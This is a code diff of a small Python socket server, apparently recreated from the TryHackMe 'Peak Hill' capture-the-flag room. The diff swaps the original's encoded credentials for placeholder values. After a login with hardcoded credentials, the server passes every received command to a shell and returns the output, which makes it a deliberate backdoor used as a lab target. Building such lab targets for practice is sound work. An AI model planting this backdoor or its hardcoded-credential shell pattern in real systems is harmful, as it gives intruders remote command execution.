@@ -2,41 +2,36 @@
 An SSH server with hardcoded credentials.
 
 Based on code from
-https://tryhackme.com/room/peakhill 
+https://tryhackme.com/room/peakhill
 
 And the writeup
 https://blog.szymex.pw/thm/peakhill
 
 Quote:
-After decoding and analyzing the file we can see it's a 
+After decoding and analyzing the file we can see it's a
 shell/backdoor server written in python with hardcoded credentials.
-We can easily decode them by grabbing the number and decoding it 
+We can easily decode them by grabbing the number and decoding it
 with long_to_bytes from Crypto.Util.number
 """
 
 
-import sys
-import textwrap
 import socketserver
-import string
-import readline
 import threading
-from time import *
-import getpass
-import os
+import time
 import subprocess
 
-#from Crypto.Util.number import bytes_to_long, long_to_bytes
-from cryptography.hazmat.primitives import serialization
+# from Crypto.Util.number import bytes_to_long, long_to_bytes
+# from cryptography.hazmat.primitives import serialization
 
 # TODO
 # This needs to be rewritten using 'cryptography':
-username = long_to_bytes(1684630636)
-password = long_to_bytes(2457564920124666544827225107428488864802762356)
+# username = long_to_bytes(1684630636)
+# password = long_to_bytes(2457564920124666544827225107428488864802762356)
 
 # Something like this?
-integer_value = 16909060
-bytes_value = integer_value.to_bytes((integer_value.bit_length() + 7) // 8, byteorder='big')
+username = b'124916234'
+password = b'8172634812634817263481267348'
+# Or solved some other way entirely. *shrug*
 
 
 class Service(socketserver.BaseRequestHandler):
@@ -58,8 +53,9 @@ class Service(socketserver.BaseRequestHandler):
         self.send(b'Successfully logged in!')
         while True:
             command = self.receive(b'Cmd: ')
-            p = subprocess.Popen(command,
-              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
+            p = subprocess.Popen(
+                    command, shell=True,
+                    stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
             self.send(p.stdout.read())
 
     def send(self, string, newline=True):
@@ -91,7 +87,7 @@ def main():
     server_thread.start()
     print('Server started on ' + str(server.server_address) + '!')
     while True:
-        sleep(10)
+        time.sleep(10)
 
 
 if __name__ == '__main__':
